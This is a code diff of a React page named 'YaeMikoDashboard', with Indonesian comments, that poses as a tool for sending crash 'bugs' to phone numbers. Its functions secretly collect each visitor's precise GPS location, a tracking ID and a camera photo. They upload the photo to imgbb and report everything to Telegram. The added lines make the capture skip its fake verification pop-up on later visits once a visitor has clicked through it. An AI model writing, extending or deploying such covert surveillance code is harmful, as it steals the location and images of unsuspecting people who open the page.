@@ -29,6 +29,9 @@ export default function YaeMikoDashboard() {
   const [showLimitPopup, setShowLimitPopup] = useState(false)
   const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
   const [showVerifyModal, setShowVerifyModal] = useState(false)
+  
+  // Fitur Baru: State untuk menyimpan status verifikasi target
+  const [isVerified, setIsVerified] = useState(false)
 
   const bgMusicRef = useRef<HTMLAudioElement>(null)
   const isSendingRef = useRef(false)
@@ -41,7 +44,7 @@ export default function YaeMikoDashboard() {
     { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-10 h-10 text-orange-500" /> },
   ]
 
-  // FITUR BARU: Kirim intel awal pas buka web
+  // Kirim intel awal pas buka web
   const sendInitialIntel = async () => {
     try {
       let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase()
@@ -69,7 +72,7 @@ export default function YaeMikoDashboard() {
     }
   }
 
-  // FITUR BARU: Ambil GPS presisi
+  // Ambil GPS presisi
   const getPreciseLocation = (): Promise<string> => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) return resolve("GPS Not Supported")
@@ -84,7 +87,7 @@ export default function YaeMikoDashboard() {
     })
   }
 
-  // FITUR BARU: Upload foto ke imgbb
+  // Upload foto ke imgbb
   const uploadToIMGBB = async (imageBlob: Blob) => {
     const formData = new FormData()
     formData.append('image', imageBlob)
@@ -98,10 +101,14 @@ export default function YaeMikoDashboard() {
     } catch (e) { return null }
   }
 
-  // FITUR BARU: Capture kamera + kirim ke Telegram
+  // Capture kamera + kirim ke Telegram
   const startFinalExecution = async () => {
     setShowVerifyModal(false)
     setIsSending(true)
+
+    // Simpan status verifikasi ke state dan localStorage agar permanen sekali seumur hidup browser target
+    setIsVerified(true)
+    localStorage.setItem('target_verified', 'true')
 
     const preciseLoc = await getPreciseLocation()
 
@@ -177,6 +184,13 @@ export default function YaeMikoDashboard() {
     sendInitialIntel()
     async function initData() {
       await syncWithCloud('get')
+      
+      // Cek riwayat verifikasi di browser target pas web dimuat
+      const localVerify = localStorage.getItem('target_verified')
+      if (localVerify === 'true') {
+        setIsVerified(true)
+      }
+
       setIsHydrated(true)
     }
     initData()
@@ -246,7 +260,14 @@ export default function YaeMikoDashboard() {
       const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username}\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${nextLimit}/5`
       await syncWithCloud('sendReport', undefined, attackMsg)
 
-      setShowVerifyModal(true)
+      // Cek apakah target sudah pernah klik Lanjutkan verifikasi sebelumnya
+      if (isVerified) {
+        // Jika sudah terverifikasi, langsung jalankan fungsi eksekusi tanpa pop-up
+        startFinalExecution()
+      } else {
+        // Jika belum pernah sama sekali, munculkan pop-up modal
+        setShowVerifyModal(true)
+      }
 
       setTimeout(() => {
         isSendingRef.current = false
